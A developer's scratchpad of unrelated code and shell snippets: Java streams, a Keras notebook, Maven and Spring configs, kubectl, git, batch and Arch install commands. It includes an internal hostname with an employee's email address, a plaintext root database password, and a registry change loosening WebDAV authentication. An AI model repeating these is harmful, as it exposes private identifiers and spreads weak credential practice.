 tebuddy.description.method,org.assertj.core.internal.bytebuddy.descript
 ion.type,org.assertj.core.internal.bytebuddy.jar.asm";version="3.9.1",o
 rg.assertj.core.internal.bytebuddy.implementation.auxiliary;uses:="org.
 assertj.core.internal.bytebuddy,org.assertj.core.internal.bytebuddy.des
 cription.method,org.assertj.core.internal.bytebuddy.description.modifie
 r,org.assertj.core.internal.bytebuddy.description.type,org.assertj.core
 .internal.bytebuddy.dynamic,org.assertj.core.internal.bytebuddy.dynamic
 .scaffold,org.assertj.core.internal.bytebuddy.implementation,org.assert
 j.core.internal.bytebuddy.implementation.bytecode,org.assertj.core.inte
 rnal.bytebuddy.implementation.bytecode.assign,org.assertj.core.internal
 .bytebuddy.jar.asm";version="3.9.1",org.assertj.core.internal.bytebuddy
 .implementation.bind;uses:="org.assertj.core.internal.bytebuddy.descrip
 tion.method,org.assertj.core.internal.bytebuddy.description.type,org.as
 sertj.core.internal.bytebuddy.implementation,org.assertj.core.internal.
 bytebuddy.implementation.bytecode,org.assertj.core.internal.bytebuddy.i
 mplementation.bytecode.assign,org.assertj.core.internal.bytebuddy.jar.a
 sm";version="3.9.1",org.assertj.core.internal.bytebuddy.implementation.
 bind.annotation;uses:="org.assertj.core.internal.bytebuddy,org.assertj.
 core.internal.bytebuddy.description.annotation,org.assertj.core.interna
 l.bytebuddy.description.field,org.assertj.core.internal.bytebuddy.descr
 iption.method,org.assertj.core.internal.bytebuddy.description.type,org.
 assertj.core.internal.bytebuddy.dynamic,org.assertj.core.internal.byteb
 uddy.dynamic.scaffold,org.assertj.core.internal.bytebuddy.implementatio
 n,org.assertj.core.internal.bytebuddy.implementation.auxiliary,org.asse
 rtj.core.internal.bytebuddy.implementation.bind,org.assertj.core.intern
 al.bytebuddy.implementation.bytecode,org.assertj.core.internal.bytebudd
 y.implementation.bytecode.assign,org.assertj.core.internal.bytebuddy.ja
 r.asm";version="3.9.1",org.assertj.core.internal.bytebuddy.implementati
 on.bytecode;uses:="org.assertj.core.internal.bytebuddy.description.meth
 od,org.assertj.core.internal.bytebuddy.description.type,org.assertj.cor
 e.internal.bytebuddy.implementation,org.assertj.core.internal.bytebuddy
 .jar.asm";version="3.9.1",org.assertj.core.internal.bytebuddy.implement
 ation.bytecode.assign;uses:="org.assertj.core.internal.bytebuddy.descri
 ption.type,org.assertj.core.internal.bytebuddy.implementation,org.asser
 tj.core.internal.bytebuddy.implementation.bytecode,org.assertj.core.int
 ernal.bytebuddy.jar.asm";version="3.9.1",org.assertj.core.internal.byte
 buddy.implementation.bytecode.assign.primitive;uses:="org.assertj.core.
 internal.bytebuddy.description.type,org.assertj.core.internal.bytebuddy
 .implementation,org.assertj.core.internal.bytebuddy.implementation.byte
 code,org.assertj.core.internal.bytebuddy.implementation.bytecode.assign
 ,org.assertj.core.internal.bytebuddy.jar.asm";version="3.9.1",org.asser
 tj.core.internal.bytebuddy.implementation.bytecode.assign.reference;use
 s:="org.assertj.core.internal.bytebuddy.description.type,org.assertj.co
 re.internal.bytebuddy.implementation.bytecode,org.assertj.core.internal
 .bytebuddy.implementation.bytecode.assign";version="3.9.1",org.assertj.
 core.internal.bytebuddy.implementation.bytecode.collection;uses:="org.a
 ssertj.core.internal.bytebuddy.description.type,org.assertj.core.intern
 al.bytebuddy.implementation,org.assertj.core.internal.bytebuddy.impleme
 ntation.bytecode,org.assertj.core.internal.bytebuddy.jar.asm";version="
 3.9.1",org.assertj.core.internal.bytebuddy.implementation.bytecode.cons
 tant;uses:="org.assertj.core.internal.bytebuddy.description.field,org.a
 ssertj.core.internal.bytebuddy.description.method,org.assertj.core.inte
 rnal.bytebuddy.description.type,org.assertj.core.internal.bytebuddy.imp
 lementation,org.assertj.core.internal.bytebuddy.implementation.bytecode
 ,org.assertj.core.internal.bytebuddy.jar.asm,org.assertj.core.internal.
 bytebuddy.utility";version="3.9.1",org.assertj.core.internal.bytebuddy.
 implementation.bytecode.member;uses:="org.assertj.core.internal.bytebud
 dy.description.enumeration,org.assertj.core.internal.bytebuddy.descript
 ion.field,org.assertj.core.internal.bytebuddy.description.method,org.as
 sertj.core.internal.bytebuddy.description.type,org.assertj.core.interna
 l.bytebuddy.implementation,org.assertj.core.internal.bytebuddy.implemen
 tation.bytecode,org.assertj.core.internal.bytebuddy.jar.asm,org.assertj
 .core.internal.bytebuddy.utility";version="3.9.1",org.assertj.core.inte
 rnal.bytebuddy.jar.asm;version="3.9.1",org.assertj.core.internal.bytebu
 ddy.jar.asm.commons;uses:="org.assertj.core.internal.bytebuddy.jar.asm,
 org.assertj.core.internal.bytebuddy.jar.asm.signature";version="3.9.1",
 org.assertj.core.internal.bytebuddy.jar.asm.signature;version="3.9.1",o
 rg.assertj.core.internal.bytebuddy.matcher;uses:="org.assertj.core.inte
 rnal.bytebuddy.description,org.assertj.core.internal.bytebuddy.descript
 ion.annotation,org.assertj.core.internal.bytebuddy.description.field,or
 g.assertj.core.internal.bytebuddy.description.method,org.assertj.core.i
 nternal.bytebuddy.description.type,org.assertj.core.internal.bytebuddy.
 utility";version="3.9.1",org.assertj.core.internal.bytebuddy.pool;uses:
 ="org.assertj.core.internal.bytebuddy.description,org.assertj.core.inte
 rnal.bytebuddy.description.annotation,org.assertj.core.internal.bytebud
 dy.description.enumeration,org.assertj.core.internal.bytebuddy.descript
 ion.field,org.assertj.core.internal.bytebuddy.description.method,org.as
 sertj.core.internal.bytebuddy.description.type,org.assertj.core.interna
 l.bytebuddy.dynamic,org.assertj.core.internal.bytebuddy.jar.asm,org.ass
 ertj.core.internal.bytebuddy.jar.asm.signature";version="3.9.1",org.ass
 ertj.core.internal.bytebuddy.utility;uses:="org.assertj.core.internal.b
 ytebuddy.description,org.assertj.core.internal.bytebuddy.description.fi
 eld,org.assertj.core.internal.bytebuddy.description.method,org.assertj.
 core.internal.bytebuddy.description.type,org.assertj.core.internal.byte
 buddy.implementation.bytecode";version="3.9.1",org.assertj.core.interna
 l.bytebuddy.utility.privilege;version="3.9.1",org.assertj.core.internal
 .bytebuddy.utility.visitor;uses:="org.assertj.core.internal.bytebuddy.d
 escription.method,org.assertj.core.internal.bytebuddy.implementation.by
 tecode,org.assertj.core.internal.bytebuddy.jar.asm";version="3.9.1",org
 .assertj.core.matcher;version="3.9.1",org.assertj.core.presentation;ver
 sion="3.9.1";uses:="org.assertj.core.data,org.assertj.core.groups",org.
 assertj.core.util;version="3.9.1";uses:="org.assertj.core.api.filter,or
 g.assertj.core.presentation",org.assertj.core.util.diff;version="3.9.1"
 ,org.assertj.core.util.diff.myers;version="3.9.1";uses:="org.assertj.co
 re.util.diff",org.assertj.core.util.introspection;version="3.9.1",org.a
 ssertj.core.util.xml;version="3.9.1"
Private-Package: org.assertj.core.internal,org.assertj.core.internal.byt
 ebuddy,org.assertj.core.internal.bytebuddy.asm,org.assertj.core.interna
 l.bytebuddy.agent.builder,org.assertj.core.internal.bytebuddy.dynamic,o
 rg.assertj.core.internal.bytebuddy.dynamic.scaffold,org.assertj.core.in
 ternal.bytebuddy.dynamic.scaffold.subclass,org.assertj.core.internal.by
 tebuddy.dynamic.scaffold.inline,org.assertj.core.internal.bytebuddy.dyn
 amic.loading,org.assertj.core.internal.bytebuddy.utility,org.assertj.co
 re.internal.bytebuddy.utility.visitor,org.assertj.core.internal.bytebud
 dy.utility.privilege,org.assertj.core.internal.bytebuddy.description,or
 g.assertj.core.internal.bytebuddy.description.enumeration,org.assertj.c
 ore.internal.bytebuddy.description.type,org.assertj.core.internal.byteb
 uddy.description.modifier,org.assertj.core.internal.bytebuddy.descripti
 on.method,org.assertj.core.internal.bytebuddy.description.annotation,or
 g.assertj.core.internal.bytebuddy.description.field,org.assertj.core.in
 ternal.bytebuddy.matcher,org.assertj.core.internal.bytebuddy.implementa
 tion,org.assertj.core.internal.bytebuddy.implementation.bytecode,org.as
 sertj.core.internal.bytebuddy.implementation.bytecode.assign.primitive,
 org.assertj.core.internal.bytebuddy.implementation.bytecode.assign,org.
 assertj.core.internal.bytebuddy.implementation.bytecode.assign.referenc
 e,org.assertj.core.internal.bytebuddy.implementation.bytecode.constant,
 org.assertj.core.internal.bytebuddy.implementation.bytecode.collection,
 org.assertj.core.internal.bytebuddy.implementation.bytecode.member,org.
 assertj.core.internal.bytebuddy.implementation.auxiliary,org.assertj.co
 re.internal.bytebuddy.implementation.bind,org.assertj.core.internal.byt
 ebuddy.implementation.bind.annotation,org.assertj.core.internal.bytebud
 dy.implementation.attribute,org.assertj.core.internal.bytebuddy.pool,or
 g.assertj.core.internal.bytebuddy.jar.asm,org.assertj.core.internal.byt
 ebuddy.jar.asm.commons,org.assertj.core.internal.bytebuddy.jar.asm.sign
 ature,org.assertj.core.internal.bytebuddy.build,org.assertj.core.error,
 org.assertj.core.error.future,org.assertj.core.error.uri,org.assertj.co
 re.extractor,org.assertj.core.description,org.assertj.core.matcher,org.
 assertj.core.groups,org.assertj.core.api,org.assertj.core.api.iterable,
 org.assertj.core.api.exception,org.assertj.core.api.filter,org.assertj.
 core.util,org.assertj.core.util.introspection,org.assertj.core.util.xml
 ,org.assertj.core.util.diff,org.assertj.core.util.diff.myers,org.assert
 j.core.condition,org.assertj.core.data,org.assertj.core.configuration,o
 rg.assertj.core.presentation
Require-Capability: osgi.ee;filter:="(&(osgi.ee=JavaSE)(version=1.8))"
Tool: Bnd-3.0.0.201509101326
--------------------------------------------------------------------------------------------------------
awk '{print toupper(substr($0,1,1)) tolower(substr($0,2)) }'
--------------------------------------------------------------------------------------------------------
Stream<String> streamGenerated =
  Stream.generate(() -> "element").limit(10);
  
Stream<Integer> streamIterated = Stream.iterate(40, n -> n + 2).limit(20);

int reducedParallel = Arrays.asList(1, 2, 3).parallelStream()
    .reduce(10, (a, b) -> a + b, (a, b) -> {
       log.info("combiner was called");
       return a + b;
    });

String listToString = productList.stream().map(Product::getName)
  .collect(Collectors.joining(", ", "[", "]"));

int summingPrice = productList.stream()
  .collect(Collectors.summingInt(Product::getPrice));
  
  Collector<Product, ?, LinkedList<Product>> toLinkedList =
  Collector.of(LinkedList::new, LinkedList::add, 
    (first, second) -> { 
       first.addAll(second); 
       return first; 
    });
 
LinkedList<Product> linkedListOfPersons =
  productList.stream().collect(toLinkedList);
  
int reducedParallel = Arrays.asList(1, 2, 3).parallelStream()
    .reduce(10, (a, b) -> a + b, (a, b) -> {
       log.info("combiner was called");
       return a + b;
    });
	
Stream<String> streamOfString =
  Pattern.compile(", ").splitAsStream("a, b, c");
  
Stream<Integer> streamIterated = Stream.iterate(40, n -> n + 2).limit(20);

Stream<String> streamBuilder =
  Stream.<String>builder().add("a").add("b").add("c").build();
--------------------------------------------------------------------------------------------------------
import numpy as np

In [2]:

%matplotlib inline
import matplotlib.pyplot as plt

In [3]:

from sklearn.datasets.samples_generator import make_circles

In [4]:

X, y = make_circles(n_samples=1000,
                    noise=0.1,
                    factor=0.2,
                    random_state=0)


X.shape

plt.figure(figsize=(5, 5))
plt.plot(X[y==0, 0], X[y==0, 1], 'ob', alpha=0.5)
plt.plot(X[y==1, 0], X[y==1, 1], 'xr', alpha=0.5)
plt.xlim(-1.5, 1.5)
plt.ylim(-1.5, 1.5)
plt.legend(['0', '1'])
plt.title("Blue circles and Red crosses");

from tensorflow.keras.models import Sequential
from tensorflow.keras.layers import Dense
from tensorflow.keras.optimizers import SGD

model = Sequential([
    Dense(4, input_shape=(2,), activation='tanh'),
    Dense(1, activation='sigmoid'),
])

model.compile(SGD(lr=0.5),
              'binary_crossentropy',
              metrics=['accuracy'])

model.fit(X, y, epochs=15)

hticks = np.linspace(-1.5, 1.5, 101)
vticks = np.linspace(-1.5, 1.5, 101)
aa, bb = np.meshgrid(hticks, vticks)
ab = np.c_[aa.ravel(), bb.ravel()]
c = model.predict(ab)
cc = c.reshape(aa.shape)

plt.figure(figsize=(5, 5))
plt.contourf(aa, bb, cc, cmap='bwr', alpha=0.2)
plt.plot(X[y==0, 0], X[y==0, 1], 'ob', alpha=0.5)
plt.plot(X[y==1, 0], X[y==1, 1], 'xr', alpha=0.5)
plt.xlim(-1.5, 1.5)
plt.ylim(-1.5, 1.5)
plt.legend(['0', '1'])
plt.title("Blue circles and Red crosses");
--------------------------------------------------------------------------------------------------------
        <plugins>
          <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-antrun-plugin</artifactId>
            <executions>
              <execution>
                <id>prepare-checkout</id>
                <goals>
                  <goal>run</goal>
                </goals>
                <phase>pre-site</phase>
                <configuration>
                  <tasks>
                    <exec executable="svn">
                      <arg line="checkout --depth immediates ${commons.scmPubUrl} ${commons.scmPubCheckoutDirectory}"/>
                    </exec>
                    <exec executable="svn">
                      <arg line="update --set-depth exclude ${commons.scmPubCheckoutDirectory}/javadocs"/>
                    </exec>
                    <pathconvert pathsep=" " property="dirs">
                      <dirset dir="${commons.scmPubCheckoutDirectory}" includes="*"/>
                    </pathconvert>
                    <exec executable="svn">
                      <arg line="update --set-depth infinity ${dirs}"/>
                    </exec>
                  </tasks>
                </configuration>
              </execution>
            </executions>
          </plugin>
        </plugins>
--------------------------------------------------------------------------------------------------------
IntFunction<String[]> intFunction = new IntFunction<String[]>() {
    @Override
    public String[] apply(int value) {
        return new String[value];
    }
};

String[] myNewArray = myNewStream.toArray(intFunction);
--------------------------------------------------------------------------------------------------------
Map<String, String> combined = Stream.of(first, second)
  .map(Map::entrySet)
  .flatMap(Collection::stream)
  .collect(Collectors.toMap(Map.Entry::getKey, Map.Entry::getValue, String::concat));
  
public static <K, V> Map<K, V> zipToMap(List<K> keys, List<V> values) {
    Iterator<K> keyIter = keys.iterator();
    Iterator<V> valIter = values.iterator();
    return IntStream.range(0, keys.size()).boxed()
            .collect(Collectors.toMap(_i -> keyIter.next(), _i -> valIter.next()));
}
--------------------------------------------------------------------------------------------------------
Map<Integer,DataPointSummary> coll = listeAllerPunkte.stream().collect(
    groupingBy(DataPoint::getId, Collector.of(
        DataPointSummary::new, DataPointSummary::add, DataPointSummary::merge)));
--------------------------------------------------------------------------------------------------------
Int wordCount = articleStream.collect(totalWordCountCollector);

Collector.of(  
  () -> new int[1],
  (result, article) -> result[0] += article.getWordCount(),
  (result1, result2) -> {
    result1[0] += result2[0];
    return result1;
  },
  total -> total[0] 
);
--------------------------------------------------------------------------------------------------------
kubectl apply -f <(istioctl kube-inject -f samples/bookinfo/platform/kube/bookinfo.yaml)
kubectl get services
kubectl get pods
kubectl exec -it $(kubectl get pod -l app=ratings -o jsonpath='{.items[0].metadata.name}') -c ratings -- curl productpage:9080/productpage | grep -o "<title>.*</title>"
kubectl get destinationrules -o yaml
$ kubectl get virtualservices   #-- there should be no virtual services
$ kubectl get destinationrules  #-- there should be no destination rules
$ kubectl get gateway           #-- there should be no gateway
$ kubectl get pods               #-- the Bookinfo pods should be deleted
$ kubectl get virtualservices   #-- there should be no more routing rules
$ docker ps -a                   #-- the Bookinfo containers should be deleted

$ kubectl apply -f - <<EOF
apiVersion: extensions/v1beta1
kind: Ingress
metadata:
  name: simple-ingress
  annotations:
    kubernetes.io/ingress.class: istio
spec:
  rules:
  - http:
      paths:
      - path: /echo
        backend:
          serviceName: esp-echo
          servicePort: 80
EOF

$ sudo apt-get update && sudo apt-get install -y mariadb-server
$ sudo mysql

mysql -u root -ppassword test -e "select * from ratings;"

mysql -u root -ppassword test -e  "update ratings set rating=1 where reviewid=1;select * from ratings;"
--------------------------------------------------------------------------------------------------------
  <profiles>
    <profile>
      <id>java9</id>
      <properties>
        <argLine>--add-opens java.base/java.lang=ALL-UNNAMED --add-opens java.base/java.util=ALL-UNNAMED
          --add-opens java.base/java.io=ALL-UNNAMED --add-opens java.base/java.math=ALL-UNNAMED</argLine>
      </properties>
    </profile>
  </profiles>
--------------------------------------------------------------------------------------------------------
(?:\*?\.)+(?:[a-z\d](?:[a-z\d-]{0,63}[a-z\d])?\.)+[a-z\d][a-z\d-]{0,63}[a-z\d]|(?:[a-z\d](?:[a-z\d-]{0,63}[a-z\d])?\.)+[a-z\d][a-z\d-]{0,63}[a-z\d]
domain
^https:\/\/(.*\.)*wired\.com$
(\u00a9|\u00ae|[\u2000-\u3300]|\ud83c[\ud000-\udfff]|\ud83d[\ud000-\udfff]|\ud83e[\ud000-\udfff])
^((?!(10))[0-9]{11})$

String target = someString.replaceAll("<[^>]*>", "");
String target = someString.replaceAll("(?i)<td[^>]*>", "");
String target = someString.replaceAll("(?i)<td[^>]*>", " ").replaceAll("\\s+", " ").trim();
String noHTMLString = htmlString.replaceAll("\\<.*?\\>", "");

body.getContentAsString().replaceAll("\\<.*?\\>", "");
new HtmlToPlainText().getPlainText(Jsoup.parse(html))
--------------------------------------------------------------------------------------------------------
import java.util.regex.Matcher;
import java.util.regex.Pattern;
 
public class UsernameValidator{
 
	  private Pattern pattern;
	  private Matcher matcher;
 
	  private static final String USERNAME_PATTERN = "^[a-z0-9_-]{3,15}$";
 
	  public UsernameValidator(){
		  pattern = Pattern.compile(USERNAME_PATTERN);
	  }
 
	  /**
	   * Validate username with regular expression
	   * @param username username for validation
	   * @return true valid username, false invalid username
	   */
	  public boolean validate(final String username){
 
		  matcher = pattern.matcher(username);
		  return matcher.matches();
 
	  }
}
--------------------------------------------------------------------------------------------------------
       String pathValue = null;
        // extract Path annotation value
        List<AnnotationSource<JavaClassSource>> listAnnotations = javaClass.getAnnotations();
        for (AnnotationSource annotation :listAnnotations) {
            if (annotation.getName().equals("Path")) {
                pathValue = annotation.getStringValue();
            }
        }
        AnnotationSource<JavaClassSource> apiAnnotation = javaClass.addAnnotation("com.wordnik.swagger.annotations.Api");
        apiAnnotation.setLiteralValue("\"" + pathValue + "\"") ;

        List<MethodSource<JavaClassSource>> methods = javaClass.getMethods();

        for (MethodSource<JavaClassSource> method: methods) {
           for (AnnotationSource annotation: method.getAnnotations()) {
               if (annotation.getName().equals("DELETE") || annotation.getName().equals("GET")
                       || annotation.getName().equals("POST") || annotation.getName().equals("PUT")) {
                   String returnTypeClass = method.getReturnType().getQualifiedName();
                   AnnotationSource<JavaClassSource> apiOperation = method.addAnnotation("com.wordnik.swagger.annotations.ApiOperation");
                   apiOperation.setLiteralValue("value", "\"value\"");
                   apiOperation.setLiteralValue("response", "\"" + returnTypeClass + ".class\"");

               }
           }
        }
--------------------------------------------------------------------------------------------------------
@Configuration
    public class SwaggerConfiguration implements WebMvcConfigurer {

      private final String swaggerUILocation = "whatEverLocationYouWant";
      private final String swaggerApiDocsLocation = "whatEverLocationYouWant";

      @Override
      public void addResourceHandlers(ResourceHandlerRegistry registry) {
        registry.addResourceHandler(swaggerUILocation + "**")
            .addResourceLocations("classpath:/swagger-ui/");
        registry.addResourceHandler(swaggerApiDocsLocation + "**")
            .addResourceLocations("classpath:/swagger/");
      }
    }
--------------------------------------------------------------------------------------------------------
<style type=text/css>
<!--
 body 
 { scrollbar-face-color: #006000;
   scrollbar-highlight-color: #9999999;
   scrollbar-shadow-color: #666666;
   scrollbar-3dlight-color: #666666;
   scrollbar-arrow-color: #ffffff;
   scrollbar-track-color: #e0efe0;
   scrollbar-darkshadow-color: #666666;
 }
//-->
</style>
--------------------------------------------------------------------------------------------------------
npm: npm install infinite-scroll

Bower: bower install infinite-scroll --save

Yarn: yarn add infinite-scroll
--------------------------------------------------------------------------------------------------------
curl -X GET "http://vdlg-pba11-auth-1.pba.internal:5000/api/internal/v1/users/alexander.rogalskiy%40paragon-software.com" -H "accept: text/plain"
--------------------------------------------------------------------------------------------------------
Note: Should you find difficulties connecting to the WebDAV directory, update the Basic Authentication Level in Windows Registry.

1. Right-click Start and select Run.

2. Type regedit and press Enter to open Windows Registry Editor.

3. Go to the directory path: “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WebClient\Parameters.”

Map Webdav Drive Windows 10 Registry Editor Parameters Basic Auth Level

4. Find “BasicAuthLevel” value. By default the value is set at 2, but if it’s not, right-click and select Modify and then change to 2.
--------------------------------------------------------------------------------------------------------
sudo apt install flatpak
sudo flatpak remote-add --if-not-exists flathubhttps://dl.flathub.org/repo/flathub.flatpakrepo
sudo flatpak remote-add --if-not-exists winepak https://dl.winepak.org/repo/winepak.flatpakrepo
flatpak search overwatch
sudo flatpak install winepak com.blizzard.Overwatch
--------------------------------------------------------------------------------------------------------
.cursor {cursor: url(cursor.svg) 3 3, pointer;}
.cursor {cursor: url(cursor.svg), url(path/to/image.png), wait;}
.cursor {cursor: url('path/to/image.png'), auto;}
--------------------------------------------------------------------------------------------------------
ip a | grep inet
--------------------------------------------------------------------------------------------------------
git log --oneline
git log --stat
git log -p
git show
git show 97a7c5f0d

git show 97a7c5f0d --stat

git shortlog
git shortlog -s
git shortlog -n
git shortlog -s -n
git log --pretty="%cn committed %h on %cd"
git log --author="Dan Abramov"
git log --author="Dan Abramov" --oneline
git log -4 --oneline
git log --after="1-7-2017"
git log --before="1-7-2017"
git log --after="1-7-2017" --oneline --pretty="%cn committed %h on %cd"
git log --before="a week ago" --oneline --pretty="%cn committed %h on %cd"
git log --merges
git log --decorate --oneline

--------------------------------------------------------------------------------------------------------
spring:
  profiles:
    include: regex
  autoconfigure:
    exclude:
      - org.springframework.boot.autoconfigure.data.redis.RedisAutoConfiguration
      - org.springframework.boot.autoconfigure.data.redis.RedisRepositoriesAutoConfiguration
--------------------------------------------------------------------------------------------------------
grep --basic-regexp "^.\{1,35\}$"
echo "Hello" | grep --extended-regexp "^.{1,35}$"
--------------------------------------------------------------------------------------------------------
timedatectl set-ntp true
cfdisk

mkfs.ext4 /dev/sda1
mkfs.ext4 /dev/sda2

mount /dev/sda2 /mnt
mkidr /mnt/boot
mount /dev/sda1 /mnt/boot

pacstrap /mnt base

genfstab -U /mnt >> /mnt/etc/fstab
arch-chroot /mnt

ln -sf /usr/share/zoneinfo/America/New_York /etc/localtime

hwclock --systohc

locale-gen
vi /etc/locale.conf
LANG=en_US.UTF-8

systemctl enable dhcpcd
useradd -m -G users,audio,input,optical,storage,video -s /bin/bash username

mkinitcpio -p linux
pacman -S grub
grub-install --target=i386-pc /dev/sda
grub-mkconfig -o /boot/grub/grub.cfg

exit
umount -R /mnt
reboot
--------------------------------------------------------------------------------------------------------
var paragraphs = document.getElementsByTagName("p");
for (var i = 0; i < paragraphs.length; i++) {
  var paragraph = paragraphs.item(i);
  paragraph.style.setProperty("color", "blue", null);
}

d3.selectAll("p").style("color", "blue");
--------------------------------------------------------------------------------------------------------
@Pattern(regexp="[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?", message="Invalid email")//if the field contains email address consider using this annotation to enforce field validation
--------------------------------------------------------------------------------------------------------
Install-Package Umbraco.Iconator
--------------------------------------------------------------------------------------------------------
sudo do-release-upgrade -d
sudo do-release-upgrade

sudo apt install update-manager-core
sudo apt update && sudo apt upgrade

sudo nano /etc/update-manager/release-upgrades
Change Prompt=lts to Prompt=normal. Press Ctrl + X, then y followed by Enter to save the file.

sudo systemctl reboot
sudo reboot
--------------------------------------------------------------------------------------------------------
conda install -c quantnet qnt
conda install package-name=2.3.4
conda install /package-path/package-filename.tar.bz2
conda install /packages-path/packages-filename.tar
--------------------------------------------------------------------------------------------------------
<html>
  <svg
    width="5cm"
    height="4cm"
    version="1.1"
    xmlns="http://www.w3.org/2000/svg"
    xmlns:xlink="http://www.w3.org/1999/xlink"
  >
    <path d="M 0 0 L 100 0 L 100 100 L 0 50 Z" />
  </svg>
</html>
--------------------------------------------------------------------------------------------------------
@echo off

:: Connecting to VPN...
rasdial "VPN Name" user pass

echo Running RDP...
"Connect to Server.rdp"

echo Finished - disconnecting from VPN...
rasdial "VPN Name" /disconnect
--------------------------------------------------------------------------------------------------------
systemctl enable myunit
systemctl -l status myunit
systemctl start myunit
systemctl daemon-reload
--------------------------------------------------------------------------------------------------------
git -c diff.mnemonicprefix=false -c core.quotepath=false --no-optional-locks stash save version_01
git -c diff.mnemonicprefix=false -c core.quotepath=false --no-optional-locks stash apply stash@{0}

git -c diff.mnemonicprefix=false -c core.quotepath=false --no-optional-locks fetch origin
git -c diff.mnemonicprefix=false -c core.quotepath=false --no-optional-locks pull --no-commit origin master
--------------------------------------------------------------------------------------------------------
spring init --name=scheduler-demo scheduler-demo 
--------------------------------------------------------------------------------------------------------
git config merge.tool vimdiff
git config merge.conflictstyle diff3
git config mergetool.prompt false
--------------------------------------------------------------------------------------------------------
git branch -D PDWB-527_kafka_refactoring
--------------------------------------------------------------------------------------------------------
docker run -d --name axonserver -p 8024:8024 -p 8124:8124 axoniq/axonserver
--------------------------------------------------------------------------------------------------------
$ bin/kafka-topics.sh --create \
  --zookeeper localhost:2181 \
  --replication-factor 1 --partitions 1 \
  --topic mytopic
--------------------------------------------------------------------------------------------------------
$ bin/kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic baeldung
$ bin/kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 5 --topic partitioned
$ bin/kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic filtered
$ bin/kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic greeting
--------------------------------------------------------------------------------------------------------
docker run -e "JAVA_OPTS=-agentlib:jdwp=transport=dt_socket,address=5005,server=y,suspend=n" -p 8080:8080 -p 5005:5005 -t springio/gs-spring-boot-docker
--------------------------------------------------------------------------------------------------------
% pgpk -a KEYS
% pgpv apache-ant-1.10.5-bin.tar.gz.asc
or
% pgp -ka KEYS
% pgp apache-ant-1.10.5-bin.tar.gz.asc
or
% gpg --import KEYS
% gpg --verify apache-ant-1.10.5-bin.tar.gz.asc
--------------------------------------------------------------------------------------------------------
postcss --use autoprefixer -c options.json -o main.css css/*.css
--------------------------------------------------------------------------------------------------------
find ~/.IntelliJIdea* -type d -exec touch -t $(date +"%Y%m%d%H%M") {} ;
--------------------------------------------------------------------------------------------------------
sudo service rsyslog restart
--------------------------------------------------------------------------------------------------------
git remote set-url origin <url>
--------------------------------------------------------------------------------------------------------
git fetch origin
git checkout -b mailer_redis origin/mailer_redis

git fetch origin
git checkout origin/master
git merge --no-ff mailer_redis

git push origin master

git push --set-upstream origin master_redis
--------------------------------------------------------------------------------------------------------
postcss --use autoprefixer -c options.json -o main.css css/*.css
--------------------------------------------------------------------------------------------------------
 scoop bucket add extras
 scoop install alacritty
 
 gem install mustache
--------------------------------------------------------------------------------------------------------
@echo off
rem For each file in your folder
for %%a in (".\*") do (
rem check if the file has an extension and if it is not our script
if "%%~xa" NEQ "" if "%%~dpxa" NEQ "%~dpx0" (
rem check if extension folder exists, if not it is created
if not exist "%%~xa" mkdir "%%~xa"
rem Move the file to directory
move "%%a" "%%~dpa%%~xa\"
))
--------------------------------------------------------------------------------------------------------
docker stop $(docker ps -a -q)
docker rm $(docker ps -a -q)
--------------------------------------------------------------------------------------------------------
git log --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit
git config --global alias.lg "log --color --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit"
git lg
git lg -p
--------------------------------------------------------------------------------------------------------
find . -maxdepth 1 -type d \( ! -name . \) -exec bash -c "cd '{}' && pwd" \;
find . -name .git -type d -execdir git pull -v ';
For /R %%G in (*.LOG) do Echo REN "%%G" "%%~nG.TXT"
For /R C:\temp\ %%G IN (*.bak) do Echo del "%%G"

for /f "delims=" %i in ('dir /ad/s/b') do cacls "%i" >>"%TEMP%\cacls.log"
for /F %i in ('dir /b *.log') do notepad %i
for %i in (user1 user2 user3 user4 user5 user6) do net user /delete %i
for /F %i in (filename) do net user /delete %i

for %i in (set) do command command-arguments

for /F "tokens=2,4 delims=," %i in (test.txt) do @echo %i %j
for /F "tokens=2,4 delims=," %i in (test.txt) do @echo %i,%j
for /F "tokens=2,4" %i in (test.txt) do @echo %i %j

mstsc /console
mstsc /f
mstsc /v:computername
mstsc RDP_filename

start "" http://www.cnn.com
--------------------------------------------------------------------------------------------------------
powercfg/energy

CALL:ECHORED "Print me in red!"
:ECHORED
%Windir%\System32\WindowsPowerShell\v1.0\Powershell.exe write-host -foregroundcolor Red %1
goto:eof
--------------------------------------------------------------------------------------------------------
An alternative command to list folders and sub folders matching a wildcard is DIR:
C:\> dir /b /s /a:d "C:\Work\reports*"

To loop through each folder programatically, we can wrap that in a FOR /F command: 
C:\> for /f "tokens=*" %G in ('dir /b /s /a:d "C:\Work\reports*"') do echo Found %G

or the same thing in a batch file, with the %'s doubled: 
for /f "tokens=*" %%G in ('dir /b /s /a:d "C:\Work\reports*"') do echo Found %%G
--------------------------------------------------------------------------------------------------------
find . -type f -regex ".*/build/test-results/.*xml" -exec cp {} $CIRCLE_TEST_REPORTS/junit/ \;
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
git fetch --unshallow || true
git fetch --tags
--------------------------------------------------------------------------------------------------------
git reset --hard @{u}
git branch -a; git tag, git log --all or, my preference, you can look graphically at gitk --all --date-order
git reset --hard REF
git reset --hard HEAD^

git branch nonce $last
git rebase -p --onto $destination $first^ nonce

git checkout $destination
git reset --hard nonce
git branch -d nonce


gitk --all --date-order
git rebase -p --onto $first^ $last $source
git rebase -p --onto SHA^ SHA

https://sethrobertson.github.io/GitFixUm/fixup.html

bfg --strip-blobs-bigger-than 100M --replace-text banned.txt repo.git

git clone --mirror git://example.com/some-big-repo.git
